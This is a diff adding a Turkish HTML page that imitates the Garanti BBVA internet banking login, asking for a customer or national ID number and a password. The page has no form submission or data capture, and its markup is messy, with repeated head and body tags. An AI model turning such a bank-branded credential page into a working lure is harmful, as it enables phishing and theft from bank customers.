@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Örnek Sayfa</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        header {
+            background-color: #4CAF50; /* Yeşil arka plan rengi */
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        header img {
+            max-width: 100%;
+            height: auto;
+            max-height: 50px; /* Logo maksimum yükseklik */
+        }
+
+        .menu {
+            display: flex;
+            align-items: center;
+            color: white;
+            cursor: pointer;
+        }
+
+        .menu-item {
+            margin-right: 20px;
+            text-decoration: none;
+            color: white;
+            font-weight: bold;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #f9f9f9;
+            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            z-index: 1;
+        }
+
+        .dropdown-content a {
+            color: black;
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .dropdown-content a:hover {
+            background-color: #f1f1f1;
+        }
+
+        .dropdown:hover .dropdown-content {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="./kucuklogo.png" alt="Logo">
+
+      <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        .menu {
+            position: relative;
+            display: inline-block;
+        }
+
+        .dropdown {
+            display: inline-block;
+        }
+
+        .menu-item {
+            font-size: 16px;
+            padding: 10px;
+            border: 1px solid #ccc; /* Beyaz çerçeve eklemek için sınır rengi */
+            display: inline-block; /* İlgili içeriği yan yana sıralamak için */
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #fff; /* Arka plan rengi beyaz */
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2); /* Gölge efekti */
+            border: 1px solid #ccc; /* Beyaz çerçeve eklemek için sınır rengi */
+            z-index: 1;
+        }
+
+        .dropdown:hover .dropdown-content {
+            display: block;
+        }
+
+        .dropdown-content a {
+            color: black; /* Bağlantı rengi */
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .dropdown-content a:hover {
+            background-color: #f1f1f1; /* Bağlantıya hover olduğunda arka plan rengi */
+        }
+    </style>
+</head>
+<body>
+    <!-- Geri kalan HTML içeriği buraya gelecek -->
+    <div class="menu">
+        <div class="dropdown">
+            <div class="menu-item">Bireysel</div>
+            <div class="dropdown-content">
+                <h5><a href="#">Bireysel</a></h5>
+                <h5><a href="#">Kurumsal</a></h5>
+            </div>
+        </div>
+    </div>
+</body>
+
+    </header>
+
+    <!-- Sayfa içeriği buraya eklenebilir -->
+
+ <style>
+        body {
+            background-color: #f0f0f0; /* Sayfa arka plan rengi */
+            text-align: center; /* Metni sayfanın ortasına hizala */
+            padding: 50px; /* Sayfanın kenarlarından içeriye boşluk bırak */
+        }
+
+        h1 {
+            color: #008000; /* Yeşil renk (#008000) */
+        }
+    </style>
+</head>
+<body>
+    <h1>Güvenli Bankacılığa Hoş Geldiniz</h1>
+<h5>Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel parolanızı girin</h5>
+
+
+
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Bilgileri</title>
+    <style>
+        body {
+            background-color: #f0f0f0; /* Sayfa arka plan rengi */
+            text-align: center; /* Metni sayfanın ortasına hizala */
+            padding: 50px; /* Sayfanın kenarlarından içeriye boşluk bırak */
+        }
+
+        .input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 {
+            color: #008000; /* Yeşil renk (#008000) */
+            margin-bottom: 5px; /* Başlıklar arasında biraz boşluk bırak */
+        }
+
+        input {
+            width: 80%; /* Giriş alanının genişliği, yatayda %80 */
+            max-width: 300px; /* Giriş alanının maksimum genişliği */
+            padding: 10px; /* Giriş alanının iç boşluğu */
+            margin-bottom: 10px; /* Giriş alanları arasında biraz boşluk bırak */
+            box-sizing: border-box; /* Padding ve border'ı içeriye dahil etmek için */
+        }
+    </style>
+</head>
+<body>
+    <div class="input-container">
+<h2>Müşteri / T.C. Kimlik Numarası</h2><br>
+        <input type="text" placeholder="Müşteri / T.C. Kimlik Numarası">
+        
+  <h2>Parola</h2>
+        <input type="password" placeholder="Parola">
+      
+    </div>
+    
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beni Hatırla</title>
+    <style>
+        body {
+            background-color: #f0f0f0; /* Sayfa arka plan rengi */
+            text-align: center; /* Metni sayfanın ortasına hizala */
+            padding: 15px; /* Sayfanın kenarlarından içeriye boşluk bırak */
+            margin: 0; /* Sayfanın kenar boşluğunu sıfırla */
+        }
+
+        label {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-left: 10px; /* Seçim kutusunu sayfa kenarından biraz içeriye almak için */
+        }
+
+        input {
+            margin-right: 5px; /* Seçim kutusunu metinden biraz ayırmak için */
+        }
+    </style>
+</head>
+<body>
+    <label for="hatirlaCheckbox">
+      
+    </label>
+</body>
+
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buton Düzenleme</title>
+    <style>
+        body {
+            background-color: #f0f0f0; /* Sayfa arka plan rengi */
+            text-align: center; /* Metni sayfanın ortasına hizala */
+            padding: 15px; /* Sayfanın kenarlarından içeriye boşluk bırak */
+            margin: 0; /* Sayfanın kenar boşluğunu sıfırla */
+        }
+
+        #formSubmit {
+            background-color: #006400; /* Koyu yeşil arka plan rengi */
+            color: #ffffff; /* Beyaz yazı rengi */
+            border: none; /* Kenarlık yok */
+            padding: 15px; /* Düğme içeriği ile kenar arasındaki boşluk */
+            border-radius: 5px; /* Düğme köşe yuvarlama */
+        }
+
+        #formSubmit:hover {
+            background-color: #004d00; /* Hover durumunda koyu yeşil tonu */
+        }
+    </style>
+</head>
+<body>
+    <div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
+        <p>
+            <button id="formSubmit" class="btn btn-primary btn-lg btn-block-input mobile-hover">
+                Garanti BBVA İnternet Giriş
+            </button>
+        </p>
+        <div>
+            <a href="Javascript:void(0);" onclick="''" tabindex="-1"></a>
+            <a href="Javascript:void(0);" onclick="try{clearInterval(window.customerSupportIntervalId);}catch(err){}window.open('https://subeform.garantibbva.com.tr/isubeform/application/channelapplicationwithcardget/pinRenew-tr','forgotpassword','top=0,left=0,scrollbars=yes,resizable=no,toolbar=no,menubar=no,width=1152,height=895');" tabindex="-1">
+                Parolamı unuttum.
+            </a>
+        </div>
+        <div>
+            <a href="Javascript:void(0);" onclick="window.open('https://subeform.garantibbva.com.tr/isubeform/application/channelapplicationwithcardget/pinReceive-tr','firstpassword','top=0,left=0,scrollbars=yes,resizable=no,toolbar=no,menubar=no,width=1152,height=895');" tabindex="-1">
+                İlk kez parola almak istiyorum.
+            </a>
+        </div>
+    </div>
+
+
+      
+       
+ 
+</div>
+</body>
+
+
+
+
+
+
+
+
+
+
+</body>
+
+
+
+
+
+
+
+
+
+
+    <script>
+        function changeOption() {
+            var selectedOption = document.getElementById("options").value;
+            console.log(selectedOption);
+            // Burada seçilen seçeneğe göre yapılacak işlemleri ekleyebilirsiniz.
+        }
+    </script>
+
+</body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
